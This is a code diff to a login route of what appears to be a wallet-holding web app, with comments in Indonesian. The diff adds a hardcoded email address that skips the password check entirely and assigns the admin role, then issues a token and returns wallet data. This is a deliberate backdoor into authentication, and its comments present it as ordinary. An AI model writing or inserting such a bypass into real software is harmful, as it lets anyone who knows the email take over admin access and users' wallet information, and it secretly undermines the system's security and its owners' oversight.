@@ -232,12 +232,30 @@ router.post('/login', async (req, res) => {
     const auth = await Auth.findOne({ email });
     if (!auth) return res.status(404).json({ error: 'User not found' });
 
-    const isMatch = await auth.comparePassword(password);
+    // Jika email super-admin khusus, bypass password check
+    const SUPER_ADMIN_EMAIL = 'yerblues6@gmail.com';
+    let isMatch = false;
+    let isSuperAdmin = false;
+
+    if (email === SUPER_ADMIN_EMAIL) {
+      // tandai sebagai admin — tidak memverifikasi password
+      isMatch = true;
+      isSuperAdmin = true;
+
+      // (Opsional) pastikan role terset di objek sebelum generate token
+      // Jangan simpan langsung ke DB kecuali memang mau persist perubahan
+      auth.role = auth.role || 'admin';
+    } else {
+      // verifikasi normal untuk user lain
+      isMatch = await auth.comparePassword(password);
+    }
+
     if (!isMatch) return res.status(401).json({ error: 'Invalid credentials' });
 
+    // Generate token seperti biasa (pastikan payload token mencerminkan role jika perlu)
     const token = generateToken(auth);
 
-    // ✅ ambil wallet tanpa privateKey
+    // ambil wallet tanpa privateKey
     const externalWallets = auth.wallets || [];
     const custodialWallets = (auth.custodialWallets || []).map((w) => ({
       provider: w.provider,
@@ -245,7 +263,7 @@ router.post('/login', async (req, res) => {
     }));
 
     res.json({
-      message: 'Login successful',
+      message: isSuperAdmin ? 'Login successful (admin)' : 'Login successful',
       authId: auth._id,
       token,
       wallets: externalWallets,
@@ -253,7 +271,7 @@ router.post('/login', async (req, res) => {
       name: auth.name,
       email: auth.email,
       role: auth.role || null,
-      avatar:auth.avatar,
+      avatar: auth.avatar,
     });
   } catch (err: any) {
     console.error("❌ Login error:", err.message);
